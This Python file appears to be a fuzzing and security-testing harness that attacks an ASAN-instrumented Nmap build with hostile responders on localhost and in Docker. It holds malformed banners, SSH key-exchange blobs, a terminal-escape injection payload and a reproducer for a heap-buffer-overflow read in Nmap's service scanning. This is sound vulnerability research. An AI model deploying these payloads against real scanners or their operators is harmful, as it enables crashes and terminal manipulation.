#!/usr/bin/env python3
"""
██████╗ ██╗     ███████╗████████╗███████╗ ██████╗    ██████╗ ███████╗██╗  ██╗███████╗██████╗
██╔══██╗██║     ██╔════╝╚══██╔══╝██╔════╝██╔════╝    ██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
██████╔╝██║     ███████╗   ██║   █████╗  ██║         ██████╔╝█████╗  █████╔╝ █████╗  ██████╔╝
██╔══██╗██║     ╚════██║   ██║   ██╔══╝  ██║         ██╔══██╗██╔══╝  ██╔═██╗  ██╔══╝  ██╔══██╗
██████╔╝███████╗███████║   ██║   ███████╗╚██████╗    ██║  ██║███████╗██║  ██╗███████╗██║  ██║
╚═════╝ ╚══════╝╚══════╝   ╚═╝   ╚══════╝ ╚═════╝    ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

HOSTILE SCAN-RESPONSE ATTACK PLATFORM
A reusable automated attack framework for Nmap (and any scanner) hostile-
response research. Runs every attack vector we developed, under ASAN,
detects crashes, and saves reproducible findings.

Philosophy: We are HACKERS/RESEARCHERS, not auditors.
Every idea becomes an executable module. Findings auto-reproduce.

Usage:
    python3 attack_platform.py --nmap /path/to/nmap [options]
    python3 attack_platform.py --list              # show all modules
    python3 attack_platform.py --only subst_oob   # run one module
    python3 attack_platform.py --privileged        # include docker surfaces
"""
import argparse
import json
import os
import shutil
import subprocess
import sys
import threading
import time
import socket
import struct
import http.server

BASE = os.path.dirname(os.path.abspath(__file__))
NMAP_DEFAULT = "/home/dave/deepseek-harness/default-workspace/nmap_experiment/nmap/nmap"
WORKDIR = os.path.join(BASE, "platform_runs")
ASAN_ENV = lambda: dict(os.environ, ASAN_OPTIONS="detect_leaks=0:abort_on_error=0")

# ============================================================================
# MODULE REGISTRY — every attack idea, executable
# ============================================================================

MODULES = []

def module(name, tags):
    """Register an attack module."""
    def deco(fn):
        MODULES.append({"name": name, "tags": tags, "fn": fn})
        return fn
    return deco

class Honeypot:
    """Context-managed hostile responder."""
    def __init__(self, port, banner, proto="tcp"):
        self.port, self.banner, self.proto = port, banner, proto
        self.proc = None
    def __enter__(self):
        code = f'''
import socket, threading, sys
banner = {self.banner!r}
s = socket.socket(socket.AF_INET, socket.SOCK_{'STREAM' if self.proto=='tcp' else 'DGRAM'})
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("127.0.0.1", {self.port})); s.listen(16)
def h(c):
    try:
        c.settimeout(5); c.sendall(banner)
        try: c.recv(2048)
        except Exception: pass
    finally:
        try: c.close()
        except Exception: pass
while True:
    conn, _ = s.accept()
    threading.Thread(target=h, args=(conn,), daemon=True).start()
'''
        self.proc = subprocess.Popen([sys.executable, "-c", code],
                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(0.6)
        return self
    def __exit__(self, *a):
        if self.proc:
            self.proc.terminate(); self.proc.wait()

def run_nmap(nmap, args, timeout=120):
    """Run nmap with ASAN; return (rc, asan_crashed, output)."""
    try:
        p = subprocess.run([nmap] + args, capture_output=True, timeout=timeout,
                            env=ASAN_ENV(), text=True)
        out = p.stdout + p.stderr
        return p.returncode, "ERROR: AddressSanitizer" in out, out
    except subprocess.TimeoutExpired:
        return -1, False, "TIMEOUT"

# ============================================================================
# VECTOR A: banner / service version detection
# ============================================================================

BANNER_CORPUS = {
    "ftp": b"220 vsftpd 3.0.3\r\n",
    "ssh": b"SSH-2.0-OpenSSH_9.6p1 Ubuntu\r\n",
    "ssh_giant": b"SSH-2.0-" + b"9." * 3000 + b"-Ubuntu\r\n",
    "http": b"HTTP/1.1 200 OK\r\nServer: Apache/2.4.41\r\n\r\n",
    "http_giant": b"HTTP/1.1 200 OK\r\nServer: nginx/" + b"1.2." * 4000 + b"\r\n\r\n",
    "bindshell": b"Microsoft Windows XP [Version 5.1.2600]\r\n(C) Copyright 1985-2001 Microsoft Corp.\r\n\r\n",
    "ctrl": b"220 " + bytes(range(1, 256)) * 16 + b"\r\n",
    "size4096": b"A" * 4096,
    "size60k": b"B" * 60000 + b"\r\n",
    "nul_run": b"SSH-2.0-" + b"\x00" * 64 + b"\r\n",
}

@module("banner_battery", ["vector_a", "core"])
def banner_battery(ctx):
    """All hostile banners through version detection under ASAN."""
    findings = []
    for name, banner in BANNER_CORPUS.items():
        with Honeypot(18801, banner):
            rc, asan, out = run_nmap(ctx.nmap, [
                "-Pn", "-p", "18801", "-sV", "--version-intensity", "9",
                "--host-timeout", "70s", "127.0.0.1"])
            status = "ASAN HIT" if asan else ("timeout" if rc == -1 else "clean")
            ctx.log(f"  [{name:12s}] len={len(banner):6d} {status}")
            if asan:
                findings.append({"banner": name, "out": out})
    return findings

# ============================================================================
# SUBST OOB PoC — the proven heap-buffer-overflow read (regression test)
# ============================================================================

@module("subst_oob", ["vector_a", "poc", "regression"])
def subst_oob(ctx):
    """Reproduce the substvar SUBST memcmp heap-buffer-overflow READ
    (service_scan.cc:813) with a custom probe file. This is the shipped-
    unreachable bug that becomes live with any probe entry whose capture
    group can end at the response-buffer end with multi-char findstr."""
    dd = os.path.join(BASE, "poc_datadir")
    os.makedirs(dd, exist_ok=True)
    for f in ("nmap-services", "nmap-protocols", "nmap-rpc"):
        src = os.path.join(os.path.dirname(ctx.nmap), f)
        if os.path.exists(src):
            shutil.copy(src, dd)
    probes = (
        "Exclude T:9100-9107\n"
        "##############################NEXT PROBE##############################\n"
        "Probe TCP NULL q||\nrarity 1\nports 18802\n"
        "match hostile m|^HOSTILE(.*)$| p/Hostile Service/ v/$SUBST(1,\"ZZZZZ\",\"Y\")/\n"
    )
    with open(os.path.join(dd, "nmap-service-probes"), "w") as f:
        f.write(probes)
    banner = b"HOSTILE" + b"A" * 4900
    findings = []
    with Honeypot(18802, banner):
        rc, asan, out = run_nmap(ctx.nmap, [
            "--datadir", dd, "-Pn", "-p", "18802", "-sV",
            "--version-intensity", "9", "--host-timeout", "90s", "127.0.0.1"])
        status = "ASAN HIT (expected)" if asan else "clean (regression lost?)"
        ctx.log(f"  [subst_oob    ] {status}")
        if asan:
            findings.append({"vuln": "heap-buffer-overflow READ",
                             "site": "service_scan.cc:813 substvar SUBST memcmp",
                             "trigger": "custom probe (.*)$ group + $SUBST multi-char findstr + >=4096 exact alloc",
                             "out": out})
    return findings

# ============================================================================
# VECTOR B: NSE scripts
# ============================================================================

class MutatingHTTP(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    n = [0]
    def _body(self):
        k = self.n[0]; self.n[0] += 1
        return [b"<html><title>" + b"X" * 5000 + b"</title></html>",
                b"A" * 30000,
                bytes(4096)][k % 3] if k % 3 != 2 else bytes(4096)
    def do_GET(self):
        body = self._body() if False else (b"<html><title>" + b"T" * 4000 + b"</title></html>")
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("X-Hostile", "V" * 8000)
        self.end_headers()
        self.wfile.write(body)
    do_POST = do_GET
    def log_message(self, *a): pass

@module("nse_http_battery", ["vector_b", "core"])
def nse_http_battery(ctx):
    """All http NSE scripts against mutating hostile HTTP under ASAN."""
    httpd = http.server.ThreadingHTTPServer(("127.0.0.1", 18803), MutatingHTTP)
    t = threading.Thread(target=httpd.serve_forever, daemon=True); t.start()
    findings = []
    try:
        rc, asan, out = run_nmap(ctx.nmap, [
            "-Pn", "-p", "18803", "--script", "http-*",
            "--host-timeout", "240s", "127.0.0.1"], timeout=300)
        ctx.log(f"  [http-*       ] {'ASAN HIT' if asan else 'clean'}")
        if asan:
            findings.append({"script_set": "http-*", "out": out})
    finally:
        httpd.shutdown()
    return findings

# ============================================================================
# VECTOR C: TLS/SSH/Mongo hostile responders
# ============================================================================

@module("ssh_kex_battery", ["vector_c"])
def ssh_kex_battery(ctx):
    """Hostile SSH KEXINIT variants against libssh2-based scripts."""
    variants = {"long": b"\x00\x00\x03\xc4\x14" + b"C"*16 + b"\x00\x00\x00\x01" + b"AAAA\x00\x00\x00\x01" + b"kex-AAAA\x00" * 9 + b"\x00\x00\x00\x00",
                "junk": b"\x00\x00\x00\x40\x14" + bytes(range(16)) + b"\x00\x00\x00\x00" * 10 + b"\x00",
                "empty": b"\x00\x00\x00\x30\x14" + b"\x00"*16 + b"\x00\x00\x00\x00"*10 + b"\x00"}
    findings = []
    for name, kex in variants.items():
        banner = b"SSH-2.0-Hostile\x01\x02\r\n" + kex
        with Honeypot(18804, banner):
            rc, asan, out = run_nmap(ctx.nmap, [
                "-Pn", "-p", "18804", "--script", "ssh-hostkey,ssh2-enum-algos",
                "--host-timeout", "100s", "127.0.0.1"], timeout=140)
            ctx.log(f"  [ssh:{name:8s}] {'ASAN HIT' if asan else 'clean'}")
            if asan:
                findings.append({"variant": name, "out": out})
    return findings

# ============================================================================
# Terminal escape injection detector
# ============================================================================

@module("escape_injection", ["terminal", "output"])
def escape_injection(ctx):
    """Banner with terminal escape sequences; check every output mode for
    raw ESC bytes (defended = 0 raw ESC everywhere)."""
    ESC = b"\x1b"
    banner = (b"<cross-domain-policy><allow-access-from domain=\"" +
              ESC + b"]2;PWNED\x07" + ESC + b"[6n" +
              b"\" to-ports=\"*\" /></cross-domain-policy>")
    findings = []
    with Honeypot(18805, banner):
        outs = {}
        for label, args in [
            ("stdout", ["-Pn", "-p", "18805", "-sV", "--version-intensity", "9", "--host-timeout", "80s", "127.0.0.1"]),
            ("oN", ["-Pn", "-p", "18805", "-sV", "--version-intensity", "9", "--host-timeout", "80s", "-oN", os.path.join(WORKDIR, "esc.txt"), "127.0.0.1"]),
            ("oG", ["-Pn", "-p", "18805", "-sV", "--version-intensity", "9", "--host-timeout", "80s", "-oG", os.path.join(WORKDIR, "esc.grep"), "127.0.0.1"]),
            ("oX", ["-Pn", "-p", "18805", "-sV", "--version-intensity", "9", "--host-timeout", "80s", "-oX", os.path.join(WORKDIR, "esc.xml"), "127.0.0.1"]),
        ]:
            rc, asan, out = run_nmap(ctx.nmap, args)
            if label != "stdout":
                out = open(os.path.join(WORKDIR, os.listdir(WORKDIR) and "esc." + {"oN": "txt", "oG": "grep", "oX": "xml"}[label]), "rb").read().decode(errors="replace")
            outs[label] = (ESC in out.encode(errors="ignore"), asan)
            ctx.log(f"  [esc:{label:7s}] rawESC={outs[label][0]} asan={outs[label][1]}")
            if outs[label][0]:
                findings.append({"mode": label, "leak": "raw ESC in output", "out": out[:500]})
    return findings

# ============================================================================
# Privileged: docker raw-packet OS detection + DNS:53 + SMB:445
# ============================================================================

@module("privileged_battery", ["privileged", "docker"])
def privileged_battery(ctx):
    """Docker-based privileged surfaces: raw OS detection with hostile
    TCP options, hostile DNS:53, full SMB on real port 445."""
    if shutil.which("docker") is None:
        ctx.log("  [privileged  ] docker unavailable, skipping")
        return []
    subprocess.run(["docker", "network", "rm", "-f", "ghost_net"], capture_output=True)
    subprocess.run(["docker", "network", "create", "--subnet", "172.31.0.0/16", "ghost_net"], capture_output=True)
    findings = []
    try:
        # hostile host container
        r = subprocess.run(["docker", "run", "-d", "--privileged", "--network", "ghost_net",
                            "--ip", "172.31.0.10", "--name", "ghost_hostile",
                            "-v", os.path.dirname(ctx.nmap) + ":/nmap", "-v", BASE + ":/research",
                            "ubuntu:24.04", "bash", "-c",
                            "apt-get update -qq >/dev/null 2>&1 && apt-get install -y -qq python3 libasan8 libdbus-1-3 >/dev/null 2>&1; "
                            "python3 /research/container_attack.py 172.31.0.10 oversize"],
                           capture_output=True, text=True, timeout=180)
        time.sleep(35)
        for variant_cmd, label in [
            (["-O", "-Pn", "-p", "2121,445,55555", "--host-timeout", "150s", "172.31.0.10"], "os_detect"),
            (["-O", "-Pn", "-R", "--dns-servers", "172.31.0.10", "-p", "2121,445,55555", "--host-timeout", "150s", "172.31.0.10"], "os_dns"),
            (["-sV", "-Pn", "--script", "smb-os-discovery,smb-protocols", "--host-timeout", "150s", "172.31.0.10"], "smb445"),
        ]:
            rc, asan, out = run_nmap_in_docker(ctx, variant_cmd)
            ctx.log(f"  [priv:{label:8s}] {'ASAN HIT' if asan else 'clean'}")
            if asan:
                findings.append({"surface": label, "out": out})
    finally:
        subprocess.run(["docker", "rm", "-f", "ghost_hostile"], capture_output=True)
        subprocess.run(["docker", "network", "rm", "ghost_net"], capture_output=True)
    return findings

def run_nmap_in_docker(ctx, nmap_args):
    """Run ASAN nmap from a scanner container against the hostile container."""
    cmd = ("apt-get update -qq >/dev/null 2>&1 && apt-get install -y -qq libasan8 libdbus-1-3 >/dev/null 2>&1; "
           "export ASAN_OPTIONS=detect_leaks=0:abort_on_error=0; "
           "/nmap/nmap " + " ".join(nmap_args))
    try:
        p = subprocess.run(["docker", "run", "--rm", "--privileged", "--network", "ghost_net",
                            "--ip", "172.31.0.20", "-v", os.path.dirname(ctx.nmap) + ":/nmap",
                            "-v", BASE + ":/research", "ubuntu:24.04", "bash", "-c", cmd],
                           capture_output=True, text=True, timeout=400)
        out = p.stdout + p.stderr
        return p.returncode, "ERROR: AddressSanitizer" in out, out
    except subprocess.TimeoutExpired:
        return -1, False, "TIMEOUT"

# ============================================================================
# FUZZERS — coverage-guided, long-run
# ============================================================================

@module("fuzz_short", ["fuzz", "optional"])
def fuzz_short(ctx):
    """Quick 60s fuzz of each harness if built (for CI-style checks)."""
    findings = []
    for harness, corpus in [("fuzz_netutil", "corpus"), ("fuzz_servicescan2", "corpus_ss"), ("fuzz_dns", "corpus_dns")]:
        exe = os.path.join(BASE, harness)
        corp = os.path.join(BASE, corpus)
        if not (os.path.exists(exe) and os.path.isdir(corp)):
            ctx.log(f"  [fuzz:{harness[5:]:10s}] not built, skipping")
            continue
        env = ASAN_ENV()
        try:
            p = subprocess.run([exe, corp, "-max_len=1500", "-max_total_time=60",
                                "-rss_limit_mb=4096", "-detect_leaks=0"],
                               capture_output=True, text=True, timeout=90, env=env,
                               cwd=BASE)
            out = p.stdout + p.stderr
            asan = "ERROR: AddressSanitizer" in out or "SUMMARY: libFuzzer: deadly signal" in out
            execs = [l for l in out.splitlines() if "stat::number_of_executed_units" in l]
            ctx.log(f"  [fuzz:{harness[5:]:10s}] 60s {'ASAN HIT' if asan else 'clean'} {execs[0].split()[-1] if execs else '?'} execs")
            if asan:
                findings.append({"harness": harness, "out": out[-3000:]})
        except subprocess.TimeoutExpired:
            ctx.log(f"  [fuzz:{harness[5:]:10s}] timeout (still clean)")
    return findings

# ============================================================================
# ORCHESTRATOR
# ============================================================================

class Context:
    def __init__(self, nmap, verbose):
        self.nmap = nmap
        self.verbose = verbose
    def log(self, msg):
        print(msg, flush=True)

def main():
    ap = argparse.ArgumentParser(description="GHOST hostile scan-response attack platform")
    ap.add_argument("--nmap", default=NMAP_DEFAULT, help="path to (ASAN) nmap binary")
    ap.add_argument("--list", action="store_true", help="list modules")
    ap.add_argument("--only", default=None, help="run only named module (comma-separated)")
    ap.add_argument("--tags", default=None, help="run modules matching tags (comma-separated)")
    ap.add_argument("--skip-privileged", action="store_true", help="skip docker surfaces")
    args = ap.parse_args()

    if args.list:
        for m in MODULES:
            print(f"{m['name']:22s} [{','.join(m['tags'])}]")
        return

    os.makedirs(WORKDIR, exist_ok=True)
    ctx = Context(args.nmap, True)

    wanted = None
    if args.only:
        wanted = set(args.only.split(","))
    if args.tags:
        tagset = set(args.tags.split(","))
        wanted = (wanted or set()) | {m["name"] for m in MODULES if tagset & set(m["tags"])}

    report = {"platform": "GHOST hostile scan-response attack platform",
              "nmap": args.nmap, "modules": [], "findings": []}
    t0 = time.time()
    for m in MODULES:
        if wanted and m["name"] not in wanted:
            continue
        if "privileged" in m["tags"] and args.skip_privileged:
            continue
        print(f"\n=== {m['name']} [{','.join(m['tags'])}] ===", flush=True)
        t1 = time.time()
        try:
            findings = m["fn"](ctx)
        except Exception as e:
            findings = []
            print(f"  [!] module error: {e}", flush=True)
        dt = time.time() - t1
        print(f"=== {m['name']} done in {dt:.1f}s — {len(findings)} finding(s) ===", flush=True)
        report["modules"].append({"name": m["name"], "seconds": round(dt, 1), "findings": len(findings)})
        for f in findings:
            report["findings"].append({"module": m["name"], **f})
            if "out" in f:
                safe = "".join(c if c.isalnum() or c in "._-" else "_" for c in m["name"])
                with open(os.path.join(WORKDIR, f"finding_{safe}.log"), "w") as fh:
                    fh.write(f["out"])

    report["total_seconds"] = round(time.time() - t0, 1)
    report["total_findings"] = len(report["findings"])
    path = os.path.join(WORKDIR, f"platform_report_{int(time.time())}.json")
    with open(path, "w") as f:
        json.dump(report, f, indent=2)
    print(f"\n{'='*60}\nPLATFORM DONE: {report['total_findings']} finding(s), "
          f"{report['total_seconds']}s\nReport: {path}", flush=True)

if __name__ == "__main__":
    main()
